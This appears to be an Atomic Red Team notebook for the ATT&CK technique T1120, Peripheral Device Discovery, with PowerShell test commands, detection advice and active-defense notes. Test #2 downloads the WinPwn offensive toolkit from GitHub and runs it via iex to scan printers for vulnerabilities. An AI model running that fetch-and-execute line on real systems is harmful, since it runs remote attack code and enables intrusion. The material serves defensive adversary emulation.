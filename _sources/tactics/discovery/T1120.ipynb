{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2046ebd9",
   "metadata": {},
   "source": "# T1120 - Peripheral Device Discovery\nAdversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions."
  },
  {
   "cell_type": "markdown",
   "id": "3a716f18",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1c296243",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Win32_PnPEntity Hardware Inventory",
    "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c71eaf1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1120 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f7fa4941",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b68bd1da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1120 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "373878dd",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - WinPwn - printercheck",
    "Search for printers / potential vulns using printercheck function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d06d1d8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1120 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "9e377284",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  },
  {
   "cell_type": "markdown",
   "id": "9f4415d0",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Peripheral Management \n Manage peripheral devices used on systems within the network for active defense purposes. \n\n\n \n\n Peripheral Management is the administration of peripheral devices used on systems within the network for defensive or deceptive purposes. A defender can choose to allow or deny certain types of peripherals from being used on systems. Defenders can also introduce certain peripherals to an adversary-controlled system to see how the adversary reacts.\n#### Opportunity\nThere is an opportunity to gauge an adversary's interest in connected peripheral devices.\n#### Use Case\nA defender can connect one or more peripheral devices to a decoy system to see if an adversary has any interest in them.\n#### Procedures\nIntroduce external devices (e.g. a USB drive) to a machine in an adversary engagement scenario to see how quickly an adversary gains awareness to its presence and if they attempt to leverage the device.\nConfigure controls (such as AutoRun) which would require an adversary to take additional steps when leveraging a peripheral device to execute their tools.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}